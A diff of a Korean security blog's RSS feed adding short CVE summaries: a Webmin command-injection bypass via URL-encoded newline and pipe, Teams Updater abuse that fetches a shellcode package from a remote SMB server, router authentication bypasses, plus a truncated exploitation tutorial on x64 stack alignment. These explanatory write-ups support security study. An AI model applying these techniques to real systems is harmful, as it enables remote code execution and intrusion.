@@ -9,8 +9,244 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 13 Dec 2020 04:22:39 GMT</pubDate>
+    <pubDate>Mon, 28 Dec 2020 09:01:11 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
+      <link>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</link>
+      <guid>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</guid>
+      <pubDate>Mon, 28 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin에서 Remote Command Execution 취약점이 발견되었습니다. 해당 취약점을 통해 패키지 업데이트 모듈을 사용할 수 있는 모든 유저가 root 권한으로 arbitrary command를 실행할 수 있습니다. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>에 대한 필터링은 package name 변수가 system command 안에 직접적으로 들어가므로 URL encoding을 통해 우회할 수 있습니다.(ex. command line을 한 줄 아래에서 실행)</p><p><code>u</code> 파라미터는 <code>update.cgi</code>에서 <code>@pkgs</code> 변수에 들어가서 여러 연산을 수행합니다. <code>update.cgi</code>의 함수들은 <code>package-updates-lib.pl</code>에서 호출되는데, 그중 <code>package_install(package-name, [system], [new-install])</code>은 update system이나 Wemin을 통해 패키지를 설치할 수 있고 업데이트된 패키지 목록을 반환합니다. 패지키를 설치할 때 CVE-2019-12840에 대한 조치로 <code>s/\\(-)|\\(.)/string/g;</code> 필터링이 걸려있습니다. 패키지 이름은 http request 변수이므로 <code>%0a</code>나 <code>%0c</code> 등을 통해 escape가 가능합니다. 패키지 이름 뒤에 <code>%7c</code> 등으로 pipe나 <code>.</code>을 추가하면 그 부분에 <code>\</code> 백 슬래시가 추가되어 명령 실행이 불가능하지만 <code>%0a%7c</code> 등으로 새로운 command line에서 실행하면 <code>\</code>가 무시되고 정상적으로 arbitrary command execution이 가능합니다.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">해당 취약점에 대한 Metasploit code</a></p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/command-execution/">command execution</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/cve-2019-12840/">cve-2019-12840</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/webmin/">webmin</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Adobe Reader UAF vulnerability</title>
+      <link>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</link>
+      <guid>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</guid>
+      <pubDate>Fri, 18 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader에서 원격 코드 실행까지 가능한 UAF 취약점이 발견되었습니다.</p><p><code>ESObjects</code> 는 Adobe Reader의 <code>EScript</code> 객체입니다. <code>ESObjects</code>를 구성할 때 해당 객체에 대한 포인터가 캐시에 저장됩니다. 동일한 PDDoc구조, 이름을 가진 <code>ESObject</code>를 구성할 때 새로 할당하는 대신 캐시의 <code>ESObject</code> 포인터가 사용되는데, 이때 UAF 취약점이 발생합니다.</p><p><code>ESObject</code>가 할당되고 객체 캐시에 추가될 때 <code>ESString type</code>은 ANSI입니다. 객체 캐시에서 <code>ESObject</code>를 삭제할 때 <code>ESString</code> 값으로 찾아 삭제하는데, 삭제할 항목을 검색할 때  UNICODE로 입력받아 <code>ESString</code> 항목을 찾지 못하게 됩니다. 결과적으로 <code>ESObject</code> 포인터는 삭제되지 않고, 이를 재사용할 수 있습니다.</p><p>해당 취약점은 ArrayBuffer byteLength corruption과 heap spray로 트리거해 RCE가 가능합니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/adobe-reader/">adobe reader</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/heap-spray/">heap spray</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
+      <link>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</link>
+      <guid>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</guid>
+      <pubDate>Thu, 17 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlab</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p><p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p></li><li><p>metadata 계산</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p></li></ol><p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lolbin/">lolbin</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lolbas/">lolbas</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/teams/">teams</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
+      <link>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/</link>
+      <guid>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/</guid>
+      <pubDate>Wed, 16 Dec 2020 10:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-v</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437은 uTorrent의 peer끼리 주고받는 BitTorrent protocol에서 발견된 취약점입니다. BitTorrent protocol을 시작하는 Handshake 페킷에는 bencoded dictionary를 담고 있는 <code>M field</code>가 존재합니다.</p><p>bencoded dictionary는 python dictionary와 매우 유사하며 Key와 Value를 갖습니다. 여기서 중요한 점은 nested(중첩된) dictionary의 존재인데, 즉 Value가 또 다른 하나의 dictionary가 될 수 있습니다. 중첩된 dictionary를 파싱하는 과정에서 발생하는 취약점입니다.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>충접된 dictionary를 파싱 할 때 몇 번째 layer에서 파싱하고 있는지를 32bit 크기의 <code>bit field</code>에 기록합니다. layer를 하나 들어갈 때마다 이 bit field에 한 비트씩 플래그를 설정합니다( ex. 2번째 layer 파싱 중 : 0000 0000 0000 0011 ). 만약 layer가 32보다 많이 중첩된 dictionary를 파싱하게 된다면 Crash가 발생합니다.</p><p>malicious bencoded dictionary를 담은 <code>.torrent</code>를 받는 peer의 uTorrent는 nested dictionary를 파싱하는 과정에서 Crash가 발생하고 RCE까지 이어질 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/utorrent/">utorrent</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/misparse/">misparse</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-19/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Qualcomm DSP Achilles</title>
+      <link>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</link>
+      <guid>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/</guid>
+      <pubDate>Wed, 16 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.checkpoint.com/2020/08/06/achilles-small-chi</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint는 올해 Defcon에서 Achilles라는 연구 논문을 발표했습니다. Achilles는 Qualcomm DSP( Digital Signal Processor ) 칩에서 400개 이상의 취약점을 찾은 퍼징 기술 연구입니다. Qualcomm은 다양한 칩들을 생산하는 회사로, 스마트폰 시장의 40%가 Qualcomm의 칩을 사용하고 있기 때문에 Achilles에 주목해볼 필요가 있습니다.</p><p>DSP 칩들은 기본적으로 Black box로 관리되기 때문에, manufacturer가 아니라면 DSP 칩에 대한 정보가 제한적일 수밖에 없습니다. 이 칩을 사용해 스마트폰을 만드는 제조사도 예외는 아닙니다. Checkpoint는 black box 때문에 스마트폰 제조사들이 신속하게 이슈를 고치지 못하는 상황을 지적했습니다.</p><p>올해 5월 Zerodium이 ios exploit의 제보가 너무 많다는 이유로 구매 중지를 선언했습니다. Open source인 Android 보다 취약점 제보 건수가 많다는 것을 근거로 Closed source(black box)를 유지하던 ios의 보안성은 더 이상 효과 없다는 의견이 있습니다. ios 뿐만 아니라 모든 black box의 의미가 점점 희미해지고 있는 거 같습니다.</p><p>헤커들에겐 black box의 정보 폐쇄 효과는 점점 옅어지고, vendor 입장에선 이슈를 고치지 힘든 상황이 맞물려 Achilles 연구처럼 취약점이 뭉텅이로 나오는 일이 발생했다고 볼 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/qualcomm/">qualcomm</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dsp/">dsp</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/16/fabu1ous/2020-12-16/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
+      <link>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</link>
+      <guid>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/</guid>
+      <pubDate>Tue, 15 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/30/the-anat</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)는 Pure Networks Inc. 에서 개발 한 독점 SOAP 기반 프로토콜입니다. 현재는 이 프로토콜의 사용이 중단되었지만 여전히 업데이트되지 않은 많은 라우터들이 해당 프로토콜을 사용하고 있습니다.</p><p>HNAP에서 발견된 두 가지 취약점은 다음과 같습니다.</p><p>CVE-2020-8863은 <code>LoginPassword</code> 검증 과정에서 발생하는 authentication bypass 취약점입니다. <code>strncmp()</code> 에서 db 패스워드와 클라이언트가 입력한 <code>LoginPassword</code>를 <code>LoginPassword</code>의 size 만큼 비교하는데, 이때 <code>LoginPassword</code>에 빈 값을 전달하면 비교할 size가 0이 되어 무조건 인증에 성공하게 됩니다.</p><p>CVE-2020-8864는 HNAP PrivateLogin 인증 알고리즘의 잘못된 구현으로 인해 발생하는 authentication bypass 취약점입니다. HNAP를 통해 인증할 때 서버는 일반적으로 Private key를 사용자의 암호를 기반으로 생성합니다. 그러나 로그인 요청 중 <code>PrivateLogin</code> 필드에 “Username” 값을 넣어 요청하면 “Username”값으로 Private key를 생성해  실제 관리자 암호를 몰라도 인증 챌린지 값을 알 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/authentication-bypass/">authentication bypass</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/router/">router</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bug-door/">bug-door</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/d-link/">d-link</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/15/l0ch/2020-12-15/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
+      <link>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</link>
+      <guid>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/</guid>
+      <pubDate>Mon, 14 Dec 2020 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://dirteam.com/sander/2020/12/10/dns-spoofing-vulner</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020년 12월 8일에 마이크로소프트에서 DNS Resolver addressing spoofing 취약점에 대한 보안 공지(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)가 발표됐습니다. 마이크로소프트는 해당 취약점을 통한 DNS cache poisoning attack을 막기 위해 DNS UDP 패킷의 크기를 제한하는 권고를 했습니다.</p><p>해당 취약점은 Windows TCP/IP stack에 제공되는 DNS Resolver Component에 존재합니다. DNS Resolver에 영향을 미치는 IP 조각화에 의해 DNS cache poisoning 취약점이 발생하며 해당 취약점을 exploit 한 해커는 DNS forwarder나 DNS Resolver에 의해 cache 된 DNS packet을 스푸핑 할 수 있습니다. 취약점을 성공적으로 exploit 하면 해커는 수정된 DNS record를 사용하여 해커의 웹사이트로 redirect 시킬 수 있습니다.</p><p>해당 취약점을 방지하기 위해 <code>MaximumUdpPacketSize</code> 레지스트리 값을 1,221 bytes로 수정해야 합니다. 수정된 후 DNS Resolver는 1,221 bytes보다 큰 모든 response를 TCP로 받아서 Windows Server 기반 DNS server에서 해당 취약점을 악용하려는 시도를 막을 수 있습니다.</p><p>DNS server가 실행되는 모든 Windows Server에서 관리자 권한 파워 쉘이나 원격 세션을 통한 아래의 명령줄을 실행하면 UDP 패킷 크기의 레지스트리 값을 변경할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/sad-dns/">sad dns</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dns-cache-poisoning/">dns cache poisoning</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/dns-resolver/">dns resolver</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows-server/">windows server</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/adv200013/">adv200013</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2020/12/14/idioth/2020-12-14/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Translation] Engineering Antivirus evasion Part.2</title>
@@ -32,9 +268,9 @@
       <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
       
       
-      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
-      
       <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/evasion/">evasion</category>
       
@@ -261,7 +497,7 @@
       
       
       
-      <content:encoded><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/1.png"></p><p>비밀 프로젝트( 아직 비밀, 쉿! ) 때문에 Ubuntu 20.04에서 몇 가지 테스트를 하다가 처음 보는 에러에 당황했습니다. <code>do_system+364: movaps</code> 인스트럭션에서 Segmentation Fault가 발생하더라고요.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/2.png"></p><p>알아보니까 Ubuntu 18.04부터 <code>do_system()</code>에 <code>movaps</code>인스트럭션이 하나 추가됐습니다. 조금 뒤에 자세히 설명하겠지만, x64 리눅스에선 16바이트로 stack alignment를 지켜야 합니다. stack alignment가 깨져있으면 이 인스트럭션을 실행하다 Segmentation Fault가 뜹니다.</p><p>이놈 때문에 18.04 이전 버전에서 익스 되는 BOF 공격코드가 18.04 이후 버전에서는 사용할 수 없는 경우도 있다고 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/3.png"></p><p><em>故 Fabu1ous의 네이버 블로그 (2018.10 ~ 2019.12)</em></p><p>지금까지 푼 포너블 문제만 백몇 개쯤 되고 수없이 많은 <code>system(&quot;/bin/sh&quot;)</code>을 호출해 봤는데 어째서 이 사실을 이제야 알게 된 거지?</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/4.png"></p><p>작년(2019) 크리스마스 CTF에서 단순 ROP문제를 익스 못해서 화났던 기억이 머리를 스치고 지나갔습니다. 분명 로컬에선 익스가 되던 게 리모트 익스가 안돼서 팀원에게 코드를 넘겨주고 다른 문제 보러 갔었죠. 그때 못 풀었던 ROP문제는 solo_test란 문제였는데 그때 로컬 환경이 우분투 16.04였습니다… 후…</p><p>대회 끝나고 바로 며칠 뒤에 이 주제에 대한 라업이 하나 올라왔는데 1년이 지난 지금에서야 찾아본 제 자신이 너무 밉네요. ROP문제라고 대수롭지 않게 그냥 넘겨버린 것에 반성하며 지금이라도 공부해봅시다.</p><blockquote><p>늦었다고 생각할 때가 진짜 너무 늦었다 -박명수-</p></blockquote><h1 id="x64-Stack-Alignment"><a href="#x64-Stack-Alignment" class="headerlink" title="x64 Stack Alignment"></a>x64 Stack Alignment</h1><p>stack alignment는 stack의 top이 16의 배수로 유지된 상태며 메모리의 access cycle을 최소한으로 줄이기 위해 사용합니다. ( CS를 공부하다가 “왜?”라는 질문을 던지면 십중팔구 “효율”이라는 대답이 돌아옴, 더 자세한 건 직접 찾아보시길 ) 그리고 이 stack alignment를 유지하기 위해 RSP의 위치가 정해지는 규칙이 있습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/5.png"></p><p>Linux 64 <a href="https://software.intel.com/sites/default/files/article/402129/mpx-linux64-abi.pdf">ABI</a>( Application binary interface )에 따르면 프로그램의 흐름( control )이 함수의 entry로 옮겨지는 시점에선 스택 포인터(rsp)+8이 항상 16의 배수여야 합니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/6.png"></p><p>방금 전엔 RSP를 16의 배수로 유지하는 게 stack alignment라 해놓고 갑자기 RSP+8이 16의 배수라니, 뭐라는 거야?</p><p>무슨 소린지 모르겠죠? 설명이 뭐 같이 쓰여있어서 그렇지 사실 아주 간단합니다.</p><pre><code class="hljs c"><span class="hljs-comment">// test.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello stack alignment\\n&quot;</span>);&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;hello();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><pre><code class="hljs bash">$ gcc -o <span class="hljs-built_in">test</span> test.c -no-pie$ gdb -q <span class="hljs-built_in">test</span></code></pre><p>간단한 예제를 통해 확인해봅시다. 디버깅할 때 거슬리니 PIE는 해제하고 컴파일하세요. 저는 Ubuntu 20.04와 glibc-2.31를 사용했습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/7.png"></p><pre><code class="hljs bash">pwndbg&gt; bp main</code></pre><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/8.png"></p><pre><code class="hljs bash">pwndbg&gt; r</code></pre><p>정상적으로 호출된 <code>main()</code> 함수의 entry point입니다. 아직 프롤로그를 실행하기 전이니 RSP+8은 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe038</code></p><p>RSP+8 : <code>0x7fffffffe040</code></p><p>위 스크린샷을 보면 RSP+8은 <code>0x7fffffffe040</code>이므로 16의 배수가 맞습니다.</p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/9.png"></p><p>그럼 다들 알다시피 call 인스트럭션으로 함수를 호출하면 stack에 return address를 push 하니까 call 인스트럭션을 실행하기 직전엔 RSP가 16의 배수겠죠?</p><p>RSP : <code>0x7fffffffe030</code></p><p><img src="/2020/12/06/fabu1ous/x64-stack-alignment/10.png"></p><p>그리고 함수 프롤로그에서 <code>push rbp</code>를 하니까 rbp는 항상 16의 배수겠네요?</p><p>RSP : <code>0x7ffffffffdfe0</code></p><p>대충 정리해보면 stack align을 지키면서 함수를 호출하는 흐름은 다음과 같습니다.</p><ol><li>call 실행 직전 RSP는 16의 배수 ( stack align O )</li><li>함수의 entry point에선 RSP+8이 16의 배수 ( stack align X )</li><li>함수의 프롤로그 실행 후 RSP는 16의 배수 ( stack align O )</li><li>RBP는 항상 16의 배수 ( stack align O )</li></ol><p>사실, 함수를 호출할 때 2번 과정에서 잠시 stack align이 깨지고 3번에서 다시 stack align이 맞춰집니다. 여기서 2번만 똑 떼서 “이 것만 지키시면 stack align입니다.”라고 설명을 써놔서 헷갈리는 겁니다. 이래도 이해 안 되시면 4번만 기억하세요. 4번만 신경 써줘도 공격 코드를 짜는데 아무 지장이 없을 겁니다. 더 자세한 설명은 조금 이따 하겠습니다.</p><h1 id="MOVAPS"><a href="#MOVAPS" class="headerlink" 